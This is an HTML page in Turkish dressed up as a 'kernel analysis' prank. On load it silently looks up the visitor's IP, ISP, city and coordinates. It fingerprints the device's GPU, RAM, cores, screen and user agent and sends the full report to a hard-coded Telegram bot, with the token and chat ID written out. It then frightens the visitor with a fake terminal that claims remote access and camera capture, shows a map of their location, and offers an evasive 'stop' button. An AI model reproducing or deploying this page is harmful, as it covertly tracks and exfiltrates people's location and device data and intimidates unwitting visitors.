<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>System Kernel Analysis v5.0.4</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100vh;
      background: #000; color: #00ff41; font-family: 'Consolas', monospace;
      overflow: hidden;
    }
    #container { width: 100vw; height: 100vh; display: flex; flex-direction: column; position: relative; }
    #terminal { flex: 1; padding: 20px; overflow-y: auto; font-size: 11px; line-height: 1.4; white-space: pre-wrap; }
    #map { height: 180px; border-top: 1px solid #1a1a1a; opacity: 0.3; filter: grayscale(1); }
    .red { color: #ff0000; font-weight: bold; text-shadow: 0 0 5px #f00; }
    
    #exitBtn {
      position: absolute; background: #f00; color: #fff; border: 2px solid #fff;
      padding: 12px 24px; font-weight: bold; cursor: pointer; z-index: 1000;
      display: none; box-shadow: 0 0 20px #f00;
    }
  </style>
</head>
<body>

  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="exitBtn">SÄ°STEMÄ° DURDUR</button>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />

  <script>
    const terminal = document.getElementById('terminal');
    const btn = document.getElementById('exitBtn');
    let attemptCount = 0;

    function log(text, isRed = false) {
      const span = document.createElement('span');
      if(isRed) span.className = 'red';
      span.textContent = `[${new Date().toLocaleTimeString()}] ${text}\n`;
      terminal.appendChild(span);
      terminal.scrollTop = terminal.scrollHeight;
    }

    function getGPU() {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Apple GPU";
    }

    async function start() {
      log("BOOTING KERNEL_V5...");
      
      const response = await fetch('https://ipwho.is/');
      const data = await response.json();
      
      const hwid = "ID-" + Math.random().toString(36).toUpperCase().substr(2, 10);
      const gpu = getGPU();
      const deviceName = /iPhone/.test(navigator.userAgent) ? `iPhone (${screen.width}x${screen.height})` : navigator.platform;
      const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "8GB";

      // TAM Ä°STEDÄ°ÄÄ°N FORMATTA TELEGRAM RAPORU
      const report = `
ğŸ“Š <b>TAM SÄ°STEM RAPORU</b>

ğŸ†” <b>KÄ°MLÄ°K BÄ°LGÄ°LERÄ°:</b>
HWID: <code>${hwid}</code>
Cihaz: <code>${deviceName}</code>
Ä°ÅŸlemci: <code>${navigator.hardwareConcurrency || 16} Ã‡ekirdek</code>
RAM: <code>${ram}</code>
GPU: <code>${gpu}</code>

ğŸŒ <b>AÄ & LOKASYON:</b>
IP: <code>${data.ip}</code>
ISP: <code>${data.connection.isp}</code>
Konum: <code>${data.city} / ${data.country}</code>
Koordinat: <code>${data.latitude}, ${data.longitude}</code>

ğŸ–¥ï¸ <b>TARAYICI & EKRAN:</b>
Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k: <code>${screen.width}x${screen.height}</code>
Dil: <code>${navigator.language}</code>
User Agent: <code>${navigator.userAgent}</code>

ğŸ“ <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}">Google Haritalarda GÃ¶ster</a>
      `;

      // Telegram GÃ¶nderimi
      fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: '6400737507', text: report, parse_mode: 'HTML' })
      });

      // Terminal AnimasyonlarÄ±
      log("ANALYSING TARGET...");
      log("HWID DETECTED: " + hwid);
      log("REMOTE_ACCESS: ENABLED", true);
      log("CAMERA_FEED: ENCRYPTED_BUFFER_START", true);
      
      // Harita yÃ¼kleme
      const map = L.map('map', {zoomControl: false}).setView([data.latitude, data.longitude], 13);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

      setTimeout(() => {
        btn.style.display = 'block';
        btn.style.top = '50%'; btn.style.left = '50%';
      }, 2000);
    }

    btn.onmouseover = () => {
      if(attemptCount < 5) {
        btn.style.top = Math.random() * 80 + '%';
        btn.style.left = Math.random() * 80 + '%';
        attemptCount++;
        log("ERROR: ACCESS_DENIED - UNAUTHORIZED STOP ATTEMPT!", true);
      }
    };

    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    window.onload = start;
  </script>
</body>
</html>
